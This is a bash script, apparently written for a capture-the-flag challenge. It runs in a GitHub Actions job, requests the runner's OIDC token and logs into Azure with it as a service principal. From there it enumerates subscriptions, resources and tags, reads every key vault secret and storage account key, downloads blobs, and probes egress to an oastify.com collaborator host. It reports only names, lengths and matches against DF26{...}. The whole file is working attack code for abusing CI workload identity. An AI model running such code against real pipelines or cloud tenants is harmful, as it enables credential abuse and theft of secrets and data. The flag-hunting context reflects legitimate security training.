#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 2: diagnostic map.
#
# The Actions log of a public repo is world-readable, so this prints STRUCTURE only
# (names, counts, exit codes, error text) and never a secret value. For each candidate
# it reports only whether the content matches DF26{...}.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
say() { echo "[*] $*"; }
hit() { grep -qoE 'DF26\{[^}]+\}' <<<"$1" && echo "MATCH" || echo "-"; }

# ---------------------------------------------------------------- egress check
say "egress example.com -> $(curl -sS -o /dev/null -m 15 -w '%{http_code}' https://example.com 2>&1)"
say "egress collaborator -> $(curl -sS -o /dev/null -m 15 -w '%{http_code}' "http://${COLLAB}/egress" 2>&1)"

# ---------------------------------------------------------------- 1. federate
OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
[ -z "$OIDC" ] && { say "no OIDC token"; exit 1; }

az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$OIDC" --allow-no-subscriptions >/dev/null 2>&1 \
  && say "az login OK" || { say "az login FAILED"; exit 1; }

say "identity: $(az account show --query '{name:name,id:id,tenant:tenantId}' -o json 2>&1 | tr -d '\n')"

# ---------------------------------------------------------------- 2. inventory
say "--- subscriptions ---"
az account list --all --query "[].{name:name,id:id,state:state}" -o tsv 2>&1 | sed 's/^/    /'

say "--- resource groups ---"
az group list --query "[].{n:name,loc:location}" -o tsv 2>&1 | sed 's/^/    /'

say "--- resource group TAGS (flag often hides here) ---"
for G in $(az group list --query "[].name" -o tsv 2>/dev/null); do
  T=$(az group show -n "$G" --query tags -o json 2>&1)
  say "    rg=$G tagkeys=$(jq -r 'if type=="object" then (keys|join(",")) else . end' <<<"$T" 2>/dev/null) flag=$(hit "$T")"
done

say "--- resources ---"
az resource list --query "[].{n:name,t:type,g:resourceGroup}" -o tsv 2>&1 | sed 's/^/    /'

say "--- resource TAGS ---"
RT=$(az resource list --query "[].{n:name,tags:tags}" -o json 2>&1)
say "    flag-in-resource-tags=$(hit "$RT")"
jq -r '.[] | select(.tags != null) | "    \(.n) -> \(.tags|keys|join(","))"' <<<"$RT" 2>/dev/null

# ---------------------------------------------------------------- 3. key vaults
say "--- key vaults ---"
for V in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  say "  vault=$V"
  LS=$(az keyvault secret list --vault-name "$V" --query "[].name" -o tsv 2>&1)
  if grep -qiE 'forbidden|denied|error' <<<"$LS"; then
    say "    list secrets DENIED: $(head -c 180 <<<"$LS" | tr -d '\n')"
    continue
  fi
  for S in $LS; do
    V2=$(az keyvault secret show --vault-name "$V" --name "$S" --query value -o tsv 2>&1)
    say "    secret=$S len=${#V2} flag=$(hit "$V2")"
  done
done

# ---------------------------------------------------------------- 4. storage
say "--- storage ---"
for A in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  RG=$(az storage account list --query "[?name=='$A'].resourceGroup" -o tsv 2>/dev/null)
  say "  account=$A rg=$RG"
  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>&1)
  if [ ${#K} -lt 40 ]; then
    say "    keys DENIED: $(head -c 180 <<<"$K" | tr -d '\n')"
    say "    retrying container list with AAD auth"
    az storage container list --account-name "$A" --auth-mode login --query "[].name" -o tsv 2>&1 \
      | sed 's/^/      /' | head -20
    continue
  fi
  for C in $(az storage container list --account-name "$A" --account-key "$K" --query "[].name" -o tsv 2>/dev/null); do
    say "    container=$C"
    for B in $(az storage blob list --account-name "$A" --account-key "$K" -c "$C" --query "[].name" -o tsv 2>/dev/null); do
      D=$(az storage blob download --account-name "$A" --account-key "$K" -c "$C" -n "$B" --file /dev/stdout -o none 2>&1)
      say "      blob=$B len=${#D} flag=$(hit "$D")"
    done
  done
done

say "done"
